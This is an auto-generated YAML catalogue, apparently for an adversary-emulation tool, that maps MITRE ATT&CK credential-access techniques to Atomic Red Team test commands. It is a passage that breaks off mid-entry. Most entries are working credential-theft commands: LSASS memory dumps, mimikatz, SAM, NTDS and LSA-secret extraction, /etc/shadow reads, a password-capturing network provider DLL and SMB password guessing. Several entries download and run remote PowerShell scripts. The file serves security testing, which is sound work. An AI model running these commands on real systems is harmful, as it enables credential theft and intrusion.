# AutoStrike MITRE ATT&CK Techniques - credential-access
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1003
  name: OS Credential Dumping
  description: |-
    Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.

    Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional se...
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Gsecdump
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe" -a'
      timeout: 120
      elevation_required: true
    - name: Credential Dumping with NPPSpy
      type: powershell
      platform: windows
      command: |-
        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"
        $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
        $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
        Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
        $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
        $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
        $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
        $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
        $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
        echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
      cleanup: "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"
      timeout: 120
      elevation_required: true
    - name: Dump svchost.exe to gather RDP credentials
      type: powershell
      platform: windows
      command: |-
        $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
        if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
        C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
      cleanup: Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)
      type: powershell
      platform: windows
      command: |-
        C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
        C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
        C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
      timeout: 120
      elevation_required: true
    - name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)
      type: powershell
      platform: windows
      command: C:\Windows\System32\inetsrv\appcmd.exe list apppool /config
      timeout: 120
      elevation_required: true
    - name: Dump Credential Manager using keymgr.dll and rundll32.exe
      type: powershell
      platform: windows
      command: rundll32.exe keymgr,KRShowKeyMgr
      timeout: 120
    - name: Send NTLM Hash with RPC Test Connection
      type: powershell
      platform: windows
      command: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1003
  is_safe: false
- id: T1003.001
  name: LSASS Memory
  description: Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T15...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Dump LSASS.exe Memory using ProcDump
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\procdump.exe" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp'
      cleanup: del "C:\Windows\Temp\lsass_dump.dmp" >nul 2> nul
      timeout: 120
      elevation_required: true
    - name: Dump LSASS.exe Memory using comsvcs.dll
      type: powershell
      platform: windows
      command: C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
      cleanup: Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Dump LSASS.exe Memory using direct system calls and API unhooking
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe"'
      cleanup: del C:\windows\temp\dumpert.dmp >nul 2> nul
      timeout: 120
      elevation_required: true
    - name: Dump LSASS.exe Memory using NanoDump
      type: cmd
      platform: windows
      command: PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
      cleanup: del "%temp%\nanodump.dmp" >nul 2> nul
      timeout: 120
      elevation_required: true
    - name: Offline Credential Theft With Mimikatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "sekurlsa::minidump %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit'
      timeout: 120
      elevation_required: true
    - name: LSASS read with pypykatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz" live lsa'
      cleanup: del "%temp%\nanodump.dmp" > nul 2> nul
      timeout: 120
      elevation_required: true
    - name: Dump LSASS.exe Memory using Out-Minidump.ps1
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
        catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
        get-process lsass | Out-Minidump
      cleanup: Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Create Mini Dump of LSASS.exe using ProcDump
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\procdump.exe" -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp'
      cleanup: del "C:\Windows\Temp\lsass_dump.dmp" >nul 2> nul
      timeout: 120
      elevation_required: true
    - name: Powershell Mimikatz
      type: powershell
      platform: windows
      command: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
      timeout: 120
      elevation_required: true
    - name: Dump LSASS with createdump.exe from .Net v5
      type: powershell
      platform: windows
      command: |-
        $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
        & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
      cleanup: Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Dump LSASS.exe using imported Microsoft DLLs
      type: powershell
      platform: windows
      command: C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41
      cleanup: Remove-Item C:\Windows\Temp\lsass-xordump.t1003.001.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Dump LSASS.exe using lolbin rdrleakdiag.exe
      type: powershell
      platform: windows
      command: "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\""
      cleanup: Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Dump LSASS.exe Memory through Silent Process Exit
      type: cmd
      platform: windows
      command: PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit "%temp%\SilentProcessExit"
      cleanup: rmdir "%temp%\SilentProcessExit" /s /q >nul 2> nul
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1003/001
  is_safe: false
- id: T1003.002
  name: Security Account Manager
  description: |-
    Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.

    A number of tools can be used to retrieve the SAM file through in-memory techniques:

    * pwdumpx.exe
    * ...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Registry dump of SAM, creds, and secrets
      type: cmd
      platform: windows
      command: |-
        reg save HKLM\sam %temp%\sam
        reg save HKLM\system %temp%\system
        reg save HKLM\security %temp%\security
      cleanup: |-
        del %temp%\sam >nul 2> nul
        del %temp%\system >nul 2> nul
        del %temp%\security >nul 2> nul
      timeout: 120
      elevation_required: true
    - name: Registry parse with pypykatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_002\Scripts\pypykatz" live lsa'
      timeout: 120
      elevation_required: true
    - name: esentutl.exe SAM copy
      type: cmd
      platform: windows
      command: esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
      cleanup: del %temp%\SAM >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: PowerDump Hashes and Usernames from Registry
      type: powershell
      platform: windows
      command: |-
        Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
        Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
        Invoke-PowerDump
      timeout: 120
      elevation_required: true
    - name: dump volume shadow copy hives with certutil
      type: cmd
      platform: windows
      command: for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*
      cleanup: for /L %a in (1,1,10) do @(del %temp%\SAMvss%a >nul 2>&1)
      timeout: 120
    - name: dump volume shadow copy hives with System.IO.File
      type: powershell
      platform: windows
      command: "1..10 | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore\n}"
      cleanup: |-
        1..10 | % {
          rm "$env:TEMP\SAMvss$_" -ErrorAction Ignore
        }
      timeout: 120
    - name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        samfile -consoleoutput -noninteractive
      timeout: 120
    - name: Dumping of SAM, creds, and secrets(Reg Export)
      type: cmd
      platform: windows
      command: |-
        reg export HKLM\sam %temp%\sam
        reg export HKLM\system %temp%\system
        reg export HKLM\security %temp%\security
      cleanup: |-
        del %temp%\sam >nul 2> nul
        del %temp%\system >nul 2> nul
        del %temp%\security >nul 2> nul
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1003/002
  is_safe: false
- id: T1003.003
  name: NTDS
  description: |-
    Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

    In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that conta...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Create Volume Shadow Copy with vssadmin
      type: cmd
      platform: windows
      command: 'vssadmin.exe create shadow /for=C:'
      timeout: 120
      elevation_required: true
    - name: Copy NTDS.dit from Volume Shadow Copy
      type: cmd
      platform: windows
      command: |-
        copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
        copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
        reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
      cleanup: |-
        del "C:\Windows\Temp\ntds.dit"        >nul 2> nul
        del "C:\Windows\Temp\VSC_SYSTEM_HIVE" >nul 2> nul
        del "C:\Windows\Temp\SYSTEM_HIVE"     >nul 2> nul
      timeout: 120
      elevation_required: true
    - name: Dump Active Directory Database with NTDSUtil
      type: cmd
      platform: windows
      command: |-
        mkdir C:\Windows\Temp\ntds_T1003
        ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
      cleanup: rmdir /q /s C:\Windows\Temp\ntds_T1003 >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Create Volume Shadow Copy with WMI
      type: cmd
      platform: windows
      command: wmic shadowcopy call create Volume=C:\
      timeout: 120
      elevation_required: true
    - name: Create Volume Shadow Copy remotely with WMI
      type: cmd
      platform: windows
      command: wmic /node:"localhost" shadowcopy call create Volume=C:\
      timeout: 120
      elevation_required: true
    - name: Create Volume Shadow Copy remotely (WMI) with esentutl
      type: cmd
      platform: windows
      command: wmic /node:"localhost" process call create "cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit"
      timeout: 120
      elevation_required: true
    - name: Create Volume Shadow Copy with Powershell
      type: powershell
      platform: windows
      command: (gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')
      timeout: 120
      elevation_required: true
    - name: Create Symlink to Volume Shadow Copy
      type: cmd
      platform: windows
      command: |-
        vssadmin.exe create shadow /for=C:
        mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
      timeout: 120
      elevation_required: true
    - name: Create Volume Shadow Copy with diskshadow
      type: cmd
      platform: windows
      command: |-
        mkdir c:\exfil
        diskshadow.exe /s PathToAtomicsFolder\T1003.003\src\diskshadow.txt
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1003/003
  is_safe: false
- id: T1003.004
  name: LSA Secrets
  description: |-
    Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)

    ...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Dumping LSA Secrets
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\T1003.004\bin\PsExec.exe" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y'
      cleanup: del %temp%\secrets >nul 2> nul
      timeout: 120
      elevation_required: true
    - name: Dump Kerberos Tickets from LSA using dumper.ps1
      type: powershell
      platform: windows
      command: Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1003/004
  is_safe: false
- id: T1003.005
  name: Cached Domain Credentials
  description: |-
    Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)

    On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Passwo...
  tactic: credential-access
  platforms:
    - windows
    - linux
  executors:
    - name: Cached Credential Dump via Cmdkey
      type: cmd
      platform: windows
      command: cmdkey /list
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1003/005
  is_safe: false
- id: T1003.006
  name: DCSync
  description: |-
    Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.

    Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain c...
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: DCSync (Active Directory)
      type: cmd
      platform: windows
      command: '%tmp%\mimikatz\x64\mimikatz.exe "lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%" "exit"'
      timeout: 120
    - name: Run DSInternals Get-ADReplAccount
      type: powershell
      platform: windows
      command: Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart("\")
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1003/006
  is_safe: false
- id: T1003.007
  name: Proc Filesystem
  description: 'Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung L...'
  tactic: credential-access
  platforms:
    - linux
  executors:
    - name: Dump individual process memory with sh (Local)
      type: sh
      platform: linux
      command: |-
        sh /tmp/T1003.007.sh
        PID=$(pgrep -n -f "T1003.007")
        HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
        MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
        MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
        MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
        dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
        grep -i "PASS" "/tmp/T1003.007.bin"
      cleanup: rm -f "/tmp/T1003.007.bin"
      timeout: 60
      elevation_required: true
    - name: Dump individual process memory with sh on FreeBSD (Local)
      type: sh
      platform: linux
      command: |-
        sh /tmp/T1003.007.sh
        PID=$(pgrep -n -f "T1003.007")
        MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
        MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
        MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
        dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
        strings "/tmp/T1003.007.bin" | grep -i PASS
      cleanup: rm -f "/tmp/T1003.007.bin"
      timeout: 60
      elevation_required: true
    - name: Dump individual process memory with Python (Local)
      type: sh
      platform: linux
      command: |-
        sh /tmp/T1003.007.sh
        PID=$(pgrep -n -f "T1003.007")
        PYTHON=$(which python || which python3 || which python2)
        $PYTHON PathToAtomicsFolder/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin
        grep -i "PASS" "/tmp/T1003.007.bin"
      cleanup: rm -f "/tmp/T1003.007.bin"
      timeout: 60
      elevation_required: true
    - name: Capture Passwords with MimiPenguin
      type: bash
      platform: linux
      command: |-
        sudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt
        cat /tmp/T1003.007Test3.txt
      cleanup: rm -f /tmp/T1003.007Test3.txt > /dev/null
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1003/007
  is_safe: false
- id: T1003.008
  name: /etc/passwd and /etc/shadow
  description: |-
    Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information, including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)

    Linux stores user information such as...
  tactic: credential-access
  platforms:
    - linux
  executors:
    - name: Access /etc/shadow (Local)
      type: bash
      platform: linux
      command: |-
        sudo cat /etc/shadow > /tmp/T1003.008.txt
        cat /tmp/T1003.008.txt
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      elevation_required: true
    - name: Access /etc/master.passwd (Local)
      type: sh
      platform: linux
      command: |-
        sudo cat /etc/master.passwd > /tmp/T1003.008.txt
        cat /tmp/T1003.008.txt
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      elevation_required: true
    - name: Access /etc/passwd (Local)
      type: sh
      platform: linux
      command: |-
        cat /etc/passwd > /tmp/T1003.008.txt
        cat /tmp/T1003.008.txt
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
    - name: Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat
      type: sh
      platform: linux
      command: |-
        unamestr=$(uname)
        if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; fi
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      elevation_required: true
    - name: Access /etc/{shadow,passwd,master.passwd} with shell builtins
      type: sh
      platform: linux
      command: |-
        testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
        [ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd
        testcat /etc/passwd
        testcat /etc/shadow
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1003/008
  is_safe: false
- id: T1040
  name: Network Sniffing
  description: |-
    Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

    Data captured via this techniqu...
  tactic: credential-access
  tactics:
    - credential-access
    - discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Packet Capture Linux using tshark or tcpdump
      type: bash
      platform: linux
      command: |-
        tcpdump -c 5 -nnni ens33
        tshark -c 5 -i ens33
      timeout: 60
      elevation_required: true
    - name: Packet Capture FreeBSD using tshark or tcpdump
      type: sh
      platform: linux
      command: |-
        tcpdump -c 5 -nnni em0
        tshark -c 5 -i em0
      timeout: 60
      elevation_required: true
    - name: Packet Capture macOS using tcpdump or tshark
      type: bash
      platform: macos
      command: "sudo tcpdump -c 5 -nnni en0A    \nif [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i en0A; fi;"
      timeout: 60
      elevation_required: true
    - name: Packet Capture Windows Command Prompt
      type: cmd
      platform: windows
      command: '"c:\Program Files\Wireshark\tshark.exe" -i Ethernet -c 5'
      timeout: 120
      elevation_required: true
    - name: Windows Internal Packet Capture
      type: cmd
      platform: windows
      command: netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
      cleanup: |-
        netsh trace stop >nul 2>&1
        TIMEOUT /T 5 >nul 2>&1
        del %temp%\trace.etl >nul 2>&1
        del %temp%\trace.cab >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Windows Internal pktmon capture
      type: cmd
      platform: windows
      command: |-
        pktmon.exe start --etw  -f %TEMP%\t1040.etl
        TIMEOUT /T 5 >nul 2>&1
        pktmon.exe stop
      cleanup: del %TEMP%\t1040.etl
      timeout: 120
      elevation_required: true
    - name: Windows Internal pktmon set filter
      type: cmd
      platform: windows
      command: pktmon.exe filter add -p 445
      cleanup: pktmon filter remove
      timeout: 120
      elevation_required: true
    - name: Packet Capture macOS using /dev/bpfN with sudo
      type: bash
      platform: macos
      command: sudo /tmp/t1040_macos_pcapdemo -i en0 -t 3
      cleanup: rm -f /tmp/t1040_macos_pcapdemo
      timeout: 60
      elevation_required: true
    - name: Filtered Packet Capture macOS using /dev/bpfN with sudo
      type: bash
      platform: macos
      command: sudo /tmp/t1040_macos_pcapdemo -f -i en0 -t 3
      cleanup: rm -f /tmp/t1040_macos_pcapdemo
      timeout: 60
      elevation_required: true
    - name: Packet Capture FreeBSD using /dev/bpfN with sudo
      type: sh
      platform: linux
      command: sudo /tmp/t1040_freebsd_pcapdemo -i em0 -t 3
      cleanup: rm -f /tmp/t1040_freebsd_pcapdemo
      timeout: 60
      elevation_required: true
    - name: Filtered Packet Capture FreeBSD using /dev/bpfN with sudo
      type: sh
      platform: linux
      command: sudo /tmp/t1040_freebsd_pcapdemo -f -i em0 -t 3
      cleanup: rm -f /tmp/t1040_freebsd_pcapdemo
      timeout: 60
      elevation_required: true
    - name: Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo
      type: bash
      platform: linux
      command: sudo /tmp/t1040_linux_pcapdemo -a -t 3
      cleanup: rm -f /tmp/t1040_linux_pcapdemo
      timeout: 60
      elevation_required: true
    - name: Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo
      type: bash
      platform: linux
      command: sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3
      cleanup: rm -f /tmp/t1040_linux_pcapdemo
      timeout: 60
      elevation_required: true
    - name: Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo
      type: bash
      platform: linux
      command: sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3
      cleanup: rm -f /tmp/t1040_linux_pcapdemo
      timeout: 60
      elevation_required: true
    - name: Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo
      type: bash
      platform: linux
      command: sudo /tmp/t1040_linux_pcapdemo -a -f -t 3
      cleanup: rm -f /tmp/t1040_linux_pcapdemo
      timeout: 60
      elevation_required: true
    - name: PowerShell Network Sniffing
      type: powershell
      platform: windows
      command: |-
        New-NetEventSession -Name Capture007 -LocalFilePath "$ENV:Temp\sniff.etl"
        Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100
        Start-NetEventSession -Name Capture007
        Stop-NetEventSession -Name Capture007
        Remove-NetEventSession -Name Capture007
      cleanup: del $ENV:Temp\sniff.etl
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1040
  is_safe: false
- id: T1110.001
  name: Password Guessing
  description: Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into acc...
  tactic: credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Brute Force Credentials of single Active Directory domain users via SMB
      type: cmd
      platform: windows
      command: |-
        echo Password1> passwords.txt
        echo 1q2w3e4r>> passwords.txt
        echo Password!>> passwords.txt
        echo Spring2022>> passwords.txt
        echo ChangeMe!>> passwords.txt
        @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\%username%" "%p" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
      timeout: 120
    - name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)
      type: powershell
      platform: windows
      command: |-
        if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {
